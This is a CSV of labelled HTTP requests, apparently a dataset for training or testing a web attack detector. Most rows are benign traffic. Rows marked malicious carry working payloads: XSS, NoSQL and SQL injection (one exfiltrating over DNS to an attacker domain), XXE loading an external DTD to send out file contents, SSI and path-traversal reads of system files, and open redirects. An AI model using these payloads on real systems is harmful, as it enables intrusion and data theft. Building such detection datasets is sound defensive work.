label,text
benign,"GET /files/../images/logo.png HTTP/1.1
Host: my-personal-blog-site.info
Connection: keep-alive
Accept: image/svg+xml,image/*,*/*;q=0.9
Referer: https://my-personal-blog-site.info/blog/post/457
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.8"
benign,"POST /services/DataSync HTTP/1.1
Host: sync-backend.enterprise-software-services.co
Content-Type: application/soap+xml; charset=utf-8
Content-Length: 310
User-Agent: curl/7.81.0
Accept-Encoding: gzip, deflate
Referer: https://portal.enterprise-software-services.co/dashboard
Connection: keep-alive

<?xml version=""1.0"" encoding=""UTF-8""?>
<soap:Envelope xmlns:soap=""http://www.w3.org/2003/05/soap-envelope"">
  <soap:Body>
    <SyncData xmlns=""http://enterprise-software-services.co/data"">
      <Table>EmployeeRecords</Table>
      <LastSyncTimestamp>2024-06-10T14:32:00Z</LastSyncTimestamp>
    </SyncData>
  </soap:Body>
</soap:Envelope>"
malicious,"POST /login HTTP/1.1
Host: secure-login-gateway.com
Content-Type: application/x-www-form-urlencoded
User-Agent: Python-urllib/3.9
Accept-Encoding: identity
X-User-Filter: {""$where"":""if(this.isAdmin){var start=new Date();while((new Date())-start <=5000){};}return true;""}
Content-Length: 35

username=jane.doe&password=VerySecure123!"
malicious,"POST /app/user/settings HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 188
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Referer: https://secure-user-portal.net/app/user/profile
Pragma: no-cache

user=kenny&settings=%7B%22notes%22%3A%22Normal+settings%22%2C+%22notification%22%3Atrue%2C+%22signature%22%3A%22%3Cscript%3Eeval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))%3C%2Fscript%3E%22%7D"
benign,"GET /store/items?brand=zenith&brand=spectrum&brand=parallax&category=electronics HTTP/1.1
Host: online-retail-outlet.store
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Accept: */*
Connection: keep-alive
Via: 1.1 varnish"
benign,"GET /js/bundle.js HTTP/1.1
Host: secure-user-portal.net
User-Agent: curl/7.88.1
Accept: */*
Referer: https://secure-user-portal.net/login
Connection: close"
benign,"GET /static/v3/css/dark-theme.css HTTP/1.1
Host: quickbyte-solutions.tech
Connection: keep-alive
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.5
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:114.0) Gecko/20100101 Firefox/114.0
Accept: text/css,*/*;q=0.1
Via: 1.1 varnish"
benign,"POST /api/log HTTP/1.1
Host: event-log.service-corp.io
User-Agent: curl/7.85.0
Content-Type: application/json
Accept: */*
Connection: keep-alive

{
  ""sessionId"": ""sess_20240612_093205"",
  ""userData"": {
    ""id"": 730912,
    ""email"": ""maria.hill@samplemail.org"",
    ""profile"": {
      ""lastLogin"": ""2024-06-10T20:17:32Z"",
      ""preferences"": {
        ""newsletter"": true,
        ""notifications"": false
      }
    }
  },
  ""activity"": {
    ""accessedModules"": [""reports"", ""analytics""],
    ""actions"": [
      {
        ""type"": ""download"",
        ""target"": ""sales_q2_report.pdf"",
        ""time"": ""2024-06-12T09:31:00Z""
      }
    ]
  },
  ""tags"": [""enterprise"", ""user-activity"", ""reporting""]
}"
benign,"POST /user/profile/edit HTTP/1.1
Host: urban-eco-living.io
Content-Type: application/x-www-form-urlencoded
Content-Length: 117
Connection: close
Origin: https://urban-eco-living.io
Referer: https://urban-eco-living.io/user/profile/edit
User-Agent: curl/7.86.0
Cookie: jwt_token=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.P-6vbTmM

display_name=Sophia+Green&bio=Advocate+for+sustainable+urban+life&website_url=https%3A%2F%2Fgreenurbanecho.io&location=Vancouver%2C+Canada"
benign,"POST /api/v1/profiles HTTP/1.1
Host: cloud-data-services.ai
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjYyMzU3Mjk4IiwibmFtZSI6Ikp1bGlhbiBEdW5jaGFyIiwicm9sZSI6InVzZXIifQ.A7DpBJz8BVi3vWcT_P_4gYYDr-MifFtDxk0vTmY7wt8
Accept: application/json
Content-Type: application/json
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Mobile/15E148 Safari/604.1
Accept-Language: en-US,en;q=0.9

{""username"":""julia.dunchar"",""email"":""julia.d@example.ai"",""fullName"":""Julia Dunchar"",""preferences"":{""newsletter"":true,""notifications"":false}}"
benign,"GET /user/data?id=svc-c3ad8a21 HTTP/1.1
Host: global-saas-provider.net
User-Agent: python-requests/2.31.0
Accept: application/json
Accept-Language: en-US,en;q=0.9
Connection: close
X-Forwarded-For: 203.0.113.42"
malicious,"POST /api/v3/items/upload HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Accept: application/xml,application/xhtml+xml,text/html;q=0.9
Upgrade-Insecure-Requests: 1
Content-Type: application/xml
Content-Length: 311
Connection: keep-alive

<!DOCTYPE req [
<!ENTITY % file SYSTEM ""file:///etc/hostname"">
<!ENTITY % dtd SYSTEM ""http://items-data-steal.net/hack.dtd"">
%dtd;
%send;
]>
<request><item>&exfil;</item></request>"
benign,"GET /forum/topics?tag=python&tag=asyncio&tag=performance HTTP/1.1
Host: codersnook.dev
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.177 Safari/537.36
Accept: text/html,application/xhtml+xml
Referer: https://codersnook.dev/home
Connection: keep-alive"
benign,"GET /load?file=icons/svg/navigation/menu_icon.svg HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/114.0.1823.51
Accept: image/svg+xml,image/*,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Referer: https://community.game-dev-forum.org/forums/general
Connection: keep-alive"
benign,"GET /resource/load?path=assets/css/main.css HTTP/1.1
Host: image-harvesters.io
Accept: text/css,*/*;q=0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Connection: keep-alive
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9"
malicious,"GET /entry?forward=//accounts.securepaymentportal.biz/login HTTP/1.1
Host: payments-chipnet.com
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.5
Connection: keep-alive"
benign,"POST /api/v3/items/search HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: curl/7.79.1
Accept: application/json
Content-Type: application/json
Content-Length: 73
Connection: keep-alive

{""keywords"":[""laptop"",""ssd"",""USB-C"",""16GB RAM""],""sortOrder"":""relevance""}"
benign,"HEAD /blog/technology/quantum-computing-basics HTTP/1.1
Host: tech-savvy-hub.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15
Accept: text/html
Accept-Encoding: gzip, deflate, br
Referer: https://tech-savvy-hub.net/blog
Connection: close"
benign,"POST /submit-feedback HTTP/1.1
Host: feedback-portal.cloud-solutions.io
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Content-Length: 48
Accept: text/html,application/xhtml+xml,application/xml;q=0.9
Accept-Language: en-US,en;q=0.8
Connection: keep-alive

name=Jessica+Lee&email=&comments=Great+service+overall"
benign,"POST /api/log HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15
Accept: application/json, text/plain
Content-Type: application/json
Content-Length: 282
Cache-Control: no-cache
Referer: https://community.game-dev-forum.org/forum/discussions/5672

{""event"":{""name"":""post_reply"",""timestamp"":""2024-06-12T12:02:09+02:00""},""user"":{""username"":""pixelCrafter"",""id"":""usr76542""},""metadata"":{""replyId"":""r78930"",""thread"":{""id"":""t3456"",""title"":""Best practices for shader programming""},""device"":{""type"":""desktop"",""os"":""macOS""}}}"
malicious,"POST /secure/query/eval HTTP/1.1
Host: dataapi.online-retail-store.biz
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Accept: application/json, text/plain, */*
Content-Type: application/json
Referer: https://admin.online-retail-store.biz/panel
Content-Length: 130

{""query"":""/customers/customer[username='admin' and starts-with(password,'pass')]/customerId""}"
benign,"POST /media/file-upload HTTP/1.1
Host: my-personal-blog-site.info
Connection: keep-alive
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:112.0) Gecko/20100101 Firefox/112.0
Content-Type: multipart/form-data; boundary=--AaB03x

----AaB03x
Content-Disposition: form-data; name=""file""; filename=""notes.txt""
Content-Type: text/plain

Notes for blog post on gardening tips, no private info.
----AaB03x--"
malicious,"GET /dashboard/stats?report=%2527%2520OR%2520%2528SELECT%2520LOAD_FILE%2528CONCAT%2528%2527%255C%255C%255C%255C%2527%252C%2528SELECT%2520version%2528%2529%2529%252C%2527.attacker-domain.com%255C%255Cdata%2527%2529%2529%2529--%2520 HTTP/1.1
Host: analytics.real-time-insights.ai
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: application/xml,text/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.7
Accept-Encoding: br, gzip
Connection: keep-alive
Cookie: RTSID=9475d228ac814fa1bff12bcf3e45a98c
Referer: https://analytics.real-time-insights.ai/dashboard/home"
benign,"POST /user/newsletter/subscribe HTTP/1.1
Host: smartfinance-advice.biz
Content-Type: application/x-www-form-urlencoded
Content-Length: 36
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Accept: */*
Connection: keep-alive
Via: 1.1 google

email=finley.davis84%40moneytalk.net"
benign,"GET /docs/export?file=report-final.pdf HTTP/1.1
Host: digital-marketing-hub.co
Accept: application/pdf
Cookie: sessionid=3f72c4ead2b14d1bbd9839b4d594fd18; lang=en-US
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:112.0) Gecko/20100101 Firefox/112.0
Referer: https://digital-marketing-hub.co/profile
Connection: keep-alive"
benign,"GET /files/../images/logo.png HTTP/1.1
Host: docs-software-updates.xyz
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Accept-Encoding: gzip
Connection: keep-alive"
benign,"GET /loading/gif/spinner-loading.gif HTTP/1.1
Host: online-retail-store.biz
Accept: image/gif,*/*;q=0.4
Referer: https://online-retail-store.biz/products/electronics/tv/details
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.124 Safari/537.36
Cache-Control: max-age=0
Connection: keep-alive"
benign,"PUT /api/orders/10329 HTTP/1.1
Host: ecommerce-backend.online-retail-store.biz
Authorization: Bearer Z7P9YNbGV41WsnEo6QKtvTiHZMFqXxKr8JPlc3wf
Content-Type: application/json
Accept: application/json
User-Agent: Mozilla/5.0 (Linux; Android 10; SM-A107F Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.94 Mobile Safari/537.36
Accept-Encoding: gzip
Accept-Language: en-US,en;q=0.9
Connection: close

{""orderId"":10329,""customerId"":527,""items"":[{""productId"":112,""quantity"":2},{""productId"":984,""quantity"":1}],""status"":""processing"",""shippingAddress"":{""line1"":""742 Evergreen Terrace"",""city"":""Springfield"",""state"":""OR"",""zip"":""97403""}}"
malicious,"GET /user/profile/<iMg sRc=x oNeRrOr=alert(document.cookie)> HTTP/1.1
Host: live-community-portal.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.7
Referer: https://live-community-portal.net/home
Connection: keep-alive"
malicious,"POST /api/v4/authorize HTTP/1.1
Host: global-secure-login.biz
Content-Type: application/json
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept: application/json
Referer: https://global-secure-login.biz/login
Content-Length: 61
Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9

{""continue_to"": ""https://ads.attacker-net.info/promo""}"
benign,"GET /api/items?data=%7B%22filter%22%3A%22active%22%7D HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: application/json
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: https://api.cloud-data-services.ai/dashboard
X-CSRF-Token: 8a9f03e59c44f12b2d3e4df74f9ad37a
Cookie: auth_token=eyJhbGciOiJIUzI1NiIsInR5cCI6..."
benign,"GET /search?query=design%20patterns&comment=This%20is%20%26lt%3Bbold%26gt%3B HTTP/1.1
Host: dev-resources-center.com
Accept: text/html
Accept-Encoding: gzip, deflate, br
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1
Connection: keep-alive
Referer: https://dev-resources-center.com/"
malicious,"POST /profile/edit HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Content-Type: application/x-www-form-urlencoded
Origin: https://online-retail-store.biz
Accept-Language: en-US,en;q=0.8
Cache-Control: max-age=0
Content-Length: 63
Connection: keep-alive

user_bio=Shop+owner+and+enthusiast+%3C%21--%23InClUdE+FiLe%3D%22%2Fetc%2Fpasswd%22+--%3E"
malicious,"PATCH /api/custom_data/store HTTP/1.1
Host: user-data-sync-mobile.io
Content-Type: application/json
Content-Length: 331
Origin: https://app.user-data-sync-mobile.io
X-Requested-With: FetchAPIClient
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br

{
  ""<img src=x onerror=\""eval(String.fromCharCode(0x61, 108, 0145, 114, 0x74, 40, 0x27, 88, 0x53, 0123, 45, 0x4b, 101, 0x79, 0x27, 41))\"">"": ""user-profile-2023"",
  ""device"": ""iPhone13,3"",
  ""last_sync"": ""2024-05-23T14:12:01Z"",
  ""preferences"": {""theme"": ""dark"", ""notifications"": true}
}"
benign,"GET /status HTTP/1.1
Host: fast-track-payments.net
User-Agent: curl/7.80.0
Accept: application/json
Connection: keep-alive"
benign,"POST /discussion/new HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:113.0) Gecko/20100101 Firefox/113.0
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml
Accept-Language: en-GB,en;q=0.8
Cookie: auth_token=eyJ0eXAiOiJKV1QiLCJh...
Content-Length: 165
Connection: keep-alive
Origin: https://secure-user-portal.net

forum_post=How+do+I+properly+escape+HTML+tags%3F+For+example%2C+the+%3Ca+href%3D%22%23%22%3Eanchor%3C%2Fa%3E+is+used+often.+Is+this+a+valid+JS+selector%3F"
benign,"HEAD /index.html HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
Accept: application/json
X-Forwarded-For: 203.0.113.45
Connection: keep-alive"
benign,"POST /member/login HTTP/1.1
Host: services.my-personal-blog-site.info
Content-Type: application/x-www-form-urlencoded
Content-Length: 89
Connection: keep-alive
Cache-Control: max-age=0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
Origin: https://www.my-personal-blog-site.info

login=frankie.hawkins&pass=Freedom2024$&callback=/account/manage/preferences"
benign,"GET /favicon.ico HTTP/1.1
Host: urban-garden-supplies.biz
Connection: keep-alive
Accept: image/x-icon,image/vnd.microsoft.icon,image/png,image/svg+xml,*/*;q=0.5
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36
Sec-Fetch-Site: none
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: image"
benign,"POST /token/oauth2 HTTP/1.1
Host: login-dataauth.ai
Content-Type: application/x-www-form-urlencoded
Content-Length: 146
Authorization: Basic ZGF0YXVzZXI6c2VjcmV0KkEyMw==
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json
Referer: https://login-dataauth.ai/oauth/authorize
Cache-Control: no-store

grant_type=authorization_code&code=XPZ783DErtl&redirect_uri=https%3A%2F%2Fclientapp.dataauth.ai%2Fcallback&client_id=datauser&client_secret=secret*A23"
malicious,"GET /load?file=..%c0%ae..%c0%af..%c0%ae..%c0%afvar%c0%aflog%c0%afaccess.log HTTP/1.1
Host: logs-access-portal.org
User-Agent: curl/7.77.0
Accept: */*
Cache-Control: no-cache
Pragma: no-cache
Connection: keep-alive"
benign,"GET /members?filter[active]=true&filter[type]=admin HTTP/1.1
Host: api.inventory-management.org
User-Agent: curl/7.88.1
Accept: */*
Connection: close"
benign,"HEAD /index.html HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:115.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml
Accept-Language: en-GB,en;q=0.8
Cache-Control: no-cache
Pragma: no-cache
Connection: keep-alive"
benign,"GET /account/settings?mode=privacy&token=%7e%4a%5b%6C%7d042 HTTP/1.1
Host: user-control-panel.net
Accept: application/json
DNT: 1
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:112.0) Gecko/20100101 Firefox/112.0
Referer: https://user-control-panel.net/account/login
Connection: keep-alive"
benign,"PATCH /api/finance/accounts/42b7ef37-records HTTP/1.1
Host: finance-backend.enterprise-solutions.net
Authorization: Bearer IQX98dWpCsqVxjgTYRfOame7
Content-Type: application/json
Accept: application/json
Cache-Control: no-cache
Pragma: no-cache
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Content-Length: 33
Connection: keep-alive

{""accountStatus"":""active"",""limit"":15000}"
